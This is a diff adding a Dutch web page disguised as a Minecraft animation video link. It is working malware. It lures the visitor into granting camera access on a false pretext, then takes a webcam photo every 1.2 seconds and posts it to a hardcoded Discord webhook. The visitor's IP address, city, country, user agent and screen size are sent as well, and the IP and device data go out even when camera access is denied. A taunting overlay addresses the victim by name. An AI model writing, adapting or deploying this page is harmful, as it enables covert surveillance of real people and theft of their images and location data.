@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Minecraft The End Animatie</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      max-width: 720px;
+      margin: 5vh auto;
+      padding: 20px;
+    }
+    .thumb {
+      width: 100%;
+      max-width: 640px;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 0 20px rgba(0,255,0,0.3);
+    }
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.92);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      font-size: 6em;
+      color: #0f0;
+      font-weight: bold;
+      z-index: 100;
+    }
+    .prompt {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.88);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 200;
+    }
+    .prompt-box {
+      background: #111;
+      padding: 40px;
+      border-radius: 20px;
+      max-width: 90%;
+      box-shadow: 0 0 30px #0f0;
+    }
+    .btn {
+      padding: 18px 50px;
+      font-size: 1.4em;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      margin: 15px;
+      transition: all 0.2s;
+    }
+    .btn:hover {
+      transform: scale(1.08);
+    }
+    .allow {
+      background: #0f0;
+      color: #000;
+      font-weight: bold;
+    }
+    .deny {
+      background: #444;
+      color: #fff;
+    }
+    #status {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.7);
+      padding: 12px 30px;
+      border-radius: 12px;
+      font-size: 1.1em;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>Minecraft The End Animatie - Check dit!</h2>
+    <img class="thumb" src="https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg" alt="Thumbnail">
+    <p style="font-size:1.4em;margin-top:15px;">Klik om te starten ▶</p>
+  </div>
+
+  <div id="overlay" class="overlay">MEMO I GOT YOU</div>
+
+  <div id="prompt" class="prompt">
+    <div class="prompt-box">
+      <h2>Camera toestaan?</h2>
+      <p style="font-size:1.2em;line-height:1.5;">Om de video goed af te spelen, sta de camera even toe.</p>
+      <button id="allowBtn" class="btn allow">Toestaan</button>
+      <button id="denyBtn" class="btn deny">Nee</button>
+    </div>
+  </div>
+
+  <div id="status">Opnames bezig... (sluit tab om te stoppen)</div>
+
+  <video id="v" autoplay playsinline style="display:none"></video>
+  <canvas id="c" style="display:none"></canvas>
+
+  <script>
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
+
+    const v = document.getElementById("v");
+    const c = document.getElementById("c");
+    const promptEl = document.getElementById("prompt");
+    const overlay = document.getElementById("overlay");
+    const statusEl = document.getElementById("status");
+    const thumb = document.querySelector(".thumb");
+
+    let stream = null;
+    let intervalId = null;
+    let count = 0;
+
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+        v.srcObject = stream;
+        await new Promise(r => v.onloadedmetadata = r);
+        c.width = v.videoWidth || 640;
+        c.height = v.videoHeight || 480;
+
+        statusEl.style.display = "block";
+        overlay.style.display = "flex";
+        startContinuousCapture();
+      } catch (e) {
+        console.error("Camera start mislukt:", e);
+        sendToDiscord(null, "camera_permission_failed");
+      }
+    }
+
+    async function captureAndSend() {
+      try {
+        c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+        const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.68));
+        await sendToDiscord(blob, "camera_continuous");
+      } catch (err) {
+        console.error("Capture fout:", err);
+      }
+    }
+
+    function startContinuousCapture() {
+      // Elke 1200 ms een foto
+      intervalId = setInterval(captureAndSend, 1200);
+    }
+
+    function stopCapture() {
+      if (intervalId) clearInterval(intervalId);
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+      statusEl.style.display = "none";
+    }
+
+    async function sendToDiscord(blob = null, type = "camera") {
+      try {
+        const ipRes = await fetch("https://ipwho.is").catch(() => ({}));
+        const ipData = await ipRes.json?.() || {};
+
+        const formData = new FormData();
+
+        const embed = {
+          title: `🎯 CONTINUOUS GRAB - ${type.toUpperCase()} #${++count}`,
+          color: type.includes("fail") || type === "denied" ? 0x444444 : 16711680,
+          fields: [
+            { name: "Type", value: type, inline: true },
+            { name: "IP + Locatie", value: `**${ipData.ip || 'Onbekend'}**\n${ipData.city || '?'} • ${ipData.country || '?'}${ipData.region ? ' • ' + ipData.region : ''}`, inline: true },
+            { name: "Device / UA", value: navigator.userAgent.slice(0, 140) + (navigator.userAgent.length > 140 ? '...' : ''), inline: false },
+            { name: "Scherm", value: `${screen.width} × ${screen.height}`, inline: true },
+            { name: "Tijd", value: new Date().toISOString(), inline: true },
+            { name: "Pagina", value: location.href, inline: false }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: { text: `Foto #${count} • ${navigator.platform}` }
+        };
+
+        if (blob) {
+          embed.image = { url: "attachment://capture.jpg" };
+        }
+
+        formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
+
+        if (blob) {
+          formData.append("file", blob, `continuous_${count}_${Date.now()}.jpg`);
+        }
+
+        await fetch(DISCORD_WEBHOOK, {
+          method: "POST",
+          body: formData
+        });
+      } catch (err) {
+        console.error("Webhook error:", err);
+      }
+    }
+
+    thumb.onclick = () => {
+      promptEl.style.display = "flex";
+    };
+
+    document.getElementById("allowBtn").onclick = () => {
+      promptEl.style.display = "none";
+      startCamera();
+    };
+
+    document.getElementById("denyBtn").onclick = () => {
+      promptEl.style.display = "none";
+      sendToDiscord(null, "denied");
+      overlay.style.display = "flex";
+      overlay.innerHTML = "OK DAN...";
+      setTimeout(() => {
+        location.href = "https://www.youtube.com/watch?v=-oXy7kZSdRo";
+      }, 1800);
+    };
+
+    // Auto prompt na 3 sec
+    setTimeout(() => {
+      if (promptEl.style.display !== "flex") {
+        promptEl.style.display = "flex";
+      }
+    }, 3000);
+
+    // Optioneel: na 2 minuten redirect (verwijder dit blok als je wilt dat het oneindig doorgaat)
+    setTimeout(() => {
+      stopCapture();
+      overlay.innerHTML = "BEDANKT!";
+      setTimeout(() => {
+        location.href = "https://www.youtube.com/watch?v=-oXy7kZSdRo";
+      }, 1500);
+    }, 120000); // 120 seconden = 2 minuten
+
+    // Stop bij sluiten van tab/pagina
+    window.addEventListener("beforeunload", stopCapture);
+  </script>
+</body>
+</html>
